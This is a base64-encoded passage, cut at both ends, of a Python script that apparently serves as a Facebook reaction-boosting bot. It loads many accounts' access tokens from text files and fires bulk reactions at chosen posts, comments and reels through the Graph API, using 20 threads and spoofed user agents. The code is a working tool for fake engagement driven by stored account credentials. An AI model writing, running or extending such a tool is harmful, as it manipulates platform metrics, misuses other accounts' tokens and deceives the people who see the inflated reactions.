G1hdGNoIGZvdW5kCiAgICAgICAgcmV0dXJuIE5vbmUKCiMgRXhhbXBsZSB1c2FnZToKZGVmIHJlYWN0X2NvbW1lbnQodG9rZW4sIHVpZF91cmwsIHJlYWN0aW9uX3R5cGUsIHJlYWN0aW9uc19jb3VudCk6CiAgICAiIiIKICAgIFNlbmQgYSByZWFjdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuIGFuZCByZXR1cm4gdGhlIHJlc3VsdHMgZm9yIGZ1cnRoZXIgcHJvY2Vzc2luZy4KICAgIAogICAgUGFyYW1ldGVyczoKICAgIC0gdG9rZW4gKHN0cik6IFRoZSB0b2tlbiBpbiB0aGUgZm9ybWF0ICdlbWFpbHxhY2Nlc3NfdG9rZW4nLgogICAgLSB1aWRfdXJsIChzdHIpOiBUaGUgcG9zdCBJRCBvciB1c2VyIElEIHdoZXJlIHRoZSByZWFjdGlvbiBpcyBzZW50LgogICAgLSByZWFjdGlvbl90eXBlIChzdHIpOiBUaGUgdHlwZSBvZiByZWFjdGlvbiAoZS5nLiwgJ0xJS0UnLCAnTE9WRScpLgogICAgLSByZWFjdGlvbnNfY291bnQgKGludCk6IE51bWJlciBvZiByZWFjdGlvbnMgdG8gc2VuZC4KICAgIAogICAgUmV0dXJuczoKICAgIC0gdHVwbGU6IGFjY2Vzc190b2tlbiwgc3RhdHVzX2NvZGUsIHJlc3BvbnNlX3RleHQgb3IgZXJyb3IgbWVzc2FnZS4KICAgICIiIgogICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3BsaXQoJ3wnKVsxXQogICAgdXJsID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTguMC97dWlkX3VybH0vcmVhY3Rpb25zJwogICAgCiAgICBwYXJhbXMgPSB7CiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwKICAgICAgICAndHlwZSc6IHJlYWN0aW9uX3R5cGUKICAgIH0KICAgIAogICAgaGVhZGVyc18gPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiBXX3VlcmFnbnQoKSAgIyBZb3VyIGN1c3RvbSB1c2VyIGFnZW50IGZ1bmN0aW9uCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIHBhcmFtcz1wYXJhbXMsIGhlYWRlcnM9aGVhZGVyc18pCiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUsIHJlc3BvbnNlLnRleHQgICMgUmV0dXJuIGFjY2Vzc190b2tlbiBhbmQgcmVzcG9uc2UKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gYWNjZXNzX3Rva2VuLCBOb25lLCBzdHIoZSkKCgpkZWYgY29tbWVudF9yZWFjdCgpOgogICAgIiIiUGVyZm9ybSByZWFjdGlvbnMgYmFzZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIHN0YXJ0aW5nIGxpbmUsIHBvc3QgbGluaywgcmVhY3Rpb24gdHlwZSwgYW5kIG51bWJlciBvZiByZWFjdGlvbnMuIiIiCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0KICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUVudGVyIHRoZSBzdGFydGluZyBsaW5lIHtyZWR9KDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9e3JlZH0pOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBsaW5lIG51bWJlciBiZXR3ZWVuIDEgYW5kIHthdmFpbGFibGVfdG9rZW5zfS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XQoKICAgIHByaW50KGYiICAgIHtncmVlbn1GT1JNQVQge3llbGxvd306IHtyZWR9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA3ODA0MzIyMjI2MC9wb3N0cy81NDEzMTk5Njg0Nzk0MzkvP21pYmV4dGlkPXJTNDBhQjdTOVVjYnh3NnYiKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwb3N0X2lkID0gaW5wdXQoZiIgICB7Z3JlZW59UE9TVCBJRDogIikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgY29tbWVudF9pZCA9IGlucHV0KGYiICAge2dyZWVufUNPTU1FTlQgSUQ6ICIpCgogICAgdWlkX3VybCA9IGYie3Bvc3RfaWR9X3tjb21tZW50X2lkfSIKCiAgICBwcmludChmIiIiICAgIHt5ZWxsb3d9Q2hvb3NlIHRoZSByZWFjdGlvbiB0eXBlOgogICAgIHtibHVlfVsxXSB7Z3JlZW59TElLRQogICAgIHtibHVlfVsyXSB7Z3JlZW59TE9WRQogICAgIHtibHVlfVszXSB7Z3JlZW59V09XCiAgICAge2JsdWV9WzRdIHtncmVlbn1TQUQKICAgICB7Ymx1ZX1bNV0ge2dyZWVufUFOR1JZCiAgICAge2JsdWV9WzZdIHtncmVlbn1IQUhBCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQoKICAgIHRyeToKICAgICAgICByZWFjdGlvbl9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHJlYWN0aW9uX21hcCA9IHsKICAgICAgICAgICAgMTogIkxJS0UiLAogICAgICAgICAgICAyOiAiTE9WRSIsCiAgICAgICAgICAgIDM6ICJXT1ciLAogICAgICAgICAgICA0OiAiU0FEIiwKICAgICAgICAgICAgNTogIkFOR1JZIiwKICAgICAgICAgICAgNjogIkhBSEEiCiAgICAgICAgfQogICAgICAgIHJlYWN0aW9uX3R5cGUgPSByZWFjdGlvbl9tYXAuZ2V0KHJlYWN0aW9uX2Nob2ljZSwgTm9uZSkKICAgICAgICBpZiByZWFjdGlvbl90eXBlIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIHJlYWN0aW9uIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICB0cnk6CiAgICAgICAgbnVtX3JlYWN0aW9ucyA9IGludChpbnB1dChmIiAgICAge3llbGxvd31FbnRlciB0aGUgbnVtYmVyIG9mIHJlYWN0aW9uczogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGZvciByZWFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICBpZiBudW1fcmVhY3Rpb25zID4gbGVuKHRva2Vucyk6CiAgICAgICAgcHJpbnQoZiJ7cmVkfUVOVEVSIEFHQUlOIE5PVCBleGNlZWRpbmcge2xlbih0b2tlbnMpfSIpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcmV0dXJuCgogICAgcmVhY3Rpb25zX2NvdW50ID0gMAogICAgZmFpbGVkX3JlYWN0aW9ucyA9IDAKICAgIHRhcmdldF9yZWFjdGlvbnMgPSBudW1fcmVhY3Rpb25zICAjIFRhcmdldCBudW1iZXIgb2Ygc3VjY2Vzc2Z1bCByZWFjdGlvbnMKICAgIHJlbWFpbmluZ190b2tlbnMgPSB0b2tlbnNbOm51bV9yZWFjdGlvbnNdICAjIExpbWl0IHRoZSB0b2tlbnMgdG8gdGhlIG51bWJlciByZXF1ZXN0ZWQKCiAgICBtYXhfd29ya2VycyA9IDIwCiAgICByZXN1bHRzID0gW10KCiAgICB3aGlsZSByZWFjdGlvbnNfY291bnQgPCB0YXJnZXRfcmVhY3Rpb25zIGFuZCByZW1haW5pbmdfdG9rZW5zOgogICAgICAgICMgUGVyZm9ybSByZWFjdGlvbnMgdXNpbmcgbXVsdGl0aHJlYWRpbmcKICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgICAgIGZ1dHVyZV90b190b2tlbiA9IHtleGVjdXRvci5zdWJtaXQocmVhY3RfY29tbWVudCwgdG9rZW4sIHVpZF91cmwsIHJlYWN0aW9uX3R5cGUsIHJlYWN0aW9uc19jb3VudCk6IHRva2VuIGZvciB0b2tlbiBpbiByZW1haW5pbmdfdG9rZW5zfQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBhc19jb21wbGV0ZWQoZnV0dXJlX3RvX3Rva2VuKToKICAgICAgICAgICAgICAgIHRva2VuID0gZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0KICAgICAgICAgICAgICAgIHVpZCA9IHRva2VuLnNwbGl0KCd8JylbMF0KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4sIHN0YXR1c19jb2RlLCByZXNwb25zZV90ZXh0ID0gZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZWFjdGlvbnNfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1bUkVBQ1RPUl0ge3llbGxvd317dWlkfSAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59U1VDQ0VTU0ZVTExZIFJFQUNURUQgVE8gQ09NTUVOVCEiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGZhaWxlZF9yZWFjdGlvbnMgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBwcm9jZXNzaW5nIHRva2VuIHt0b2tlbn06IHtlfSIpCgogICAgICAgICMgUmVtb3ZlIHRva2VucyB0aGF0IGZhaWxlZAogICAgICAgIHJlbWFpbmluZ190b2tlbnMgPSBbdG9rZW4gZm9yIHRva2VuIGluIHJlbWFpbmluZ190b2tlbnMgaWYgdG9rZW4gbm90IGluIGZ1dHVyZV90b190b2tlbl0KCiAgICAgICAgaWYgZmFpbGVkX3JlYWN0aW9ucyA+IDA6CiAgICAgICAgICAgIHByaW50KGYie3JlZH1SZXRyeWluZyBmYWlsZWQgcmVhY3Rpb25zLi4ue2JsdWV9IikKCiAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiJ7Z3JlZW59VE9UQUw6IHtyZWFjdGlvbnNfY291bnR9IHN1Y2Nlc3NmdWxseSByZWFjdGVkIikKCiAgICAgICAgCgoKCiNSRUFDVCBUTyBSRUVMUwppbXBvcnQgcmVxdWVzdHMKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgcGVyZm9ybV9yZWFjdGlvbih0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSk6CiAgICAiIiJTZW5kIGEgcmVhY3Rpb24gdXNpbmcgdGhlIHByb3ZpZGVkIGFjY2VzcyB0b2tlbi4iIiIKICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnNwbGl0KCd8JylbMV0gICMgQXNzdW1pbmcgZm9ybWF0IGlzIGVtYWlsfGFjY2Vzc190b2tlbgogICAgCiAgICBhdXRvX3JlYWN0ID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dWlkX3VybH0vcmVhY3Rpb25zP3R5cGU9e3JlYWN0aW9uX3R5cGV9JmFjY2Vzc190b2tlbj17YWNjZXNzX3Rva2VufScKICAgIGhlYWRlcnNfID0gewogICAgICAgICdVc2VyLUFnZW50JzogV191ZXJhZ250KCkgICMgVXNlIHRoZSByYW5kb21seSBzZWxlY3RlZCB1c2VyIGFnZW50CiAgICB9CiAgICAKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoYXV0b19yZWFjdCwgaGVhZGVycz1oZWFkZXJzXykKICAgICAgICByZXR1cm4gYWNjZXNzX3Rva2VuLCByZXNwb25zZS5zdGF0dXNfY29kZSwgcmVzcG9uc2UudGV4dCAgIyBSZXR1cm4gdGhlIHJlc3VsdHMgZm9yIGZ1cnRoZXIgcHJvY2Vzc2luZwogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBhY2Nlc3NfdG9rZW4sIE5vbmUsIHN0cihlKSAgIyBIYW5kbGUgcmVxdWVzdCBleGNlcHRpb25zCgpkZWYgcGVyZm9ybV9yZWFjdGlvbl9mYXN0KCk6CiAgICAiIiJQZXJmb3JtIHJlYWN0aW9ucyBiYXNlZCBvbiB1c2VyIGlucHV0IGZvciBmaWxlIGNob2ljZSwgc3RhcnRpbmcgbGluZSwgcG9zdCBsaW5rLCByZWFjdGlvbiB0eXBlLCBhbmQgbnVtYmVyIG9mIHJlYWN0aW9ucy4iIiIKICAgICAgIAogICAgIyBTdGVwIDE6IEFzayB0aGUgdXNlciB3aGljaCBmaWxlIHRvIHVzZQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHtibHVlfVsxXSB7cmVkfUZSQSBBQ0NPVU5UIAogICAgIHtibHVlfVsyXSB7cmVkfUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7cmVkfVJQVyBBQ0NPVU5UCiAgICAge2JsdWV9WzRdIHtyZWR9UlBXIFBBR0VTCiAgICAge3JlZH1bMF0gIHtyZWR9IEVYSVQgCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKSAgIyBEaXNwbGF5IG9ubHkgdGhlIGZpbGVuYW1lCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICB7Z3JlZW59Q2hvb3NlOiAgIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2JsdWV9RW50ZXIgdGhlIHN0YXJ0aW5nIGxpbmUge3JlZH0oMSB0byB7YXZhaWxhYmxlX3Rva2Vuc317cmVkfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgc2VsZWN0ZWQgbGluZQogICAgCiAgICBwcmludChmIiAgICB7Z3JlZW59Rk9STUFUIHt5ZWxsb3d9OiB7cmVkfWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8xMDAwNzgwNDMyMjIyNjAvcG9zdHMvMTEwMTA1Njg4MjY3NTM4Lz9taWJleHRpZD1yUzQwYUI3UzlVY2J4dzZ2IikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOK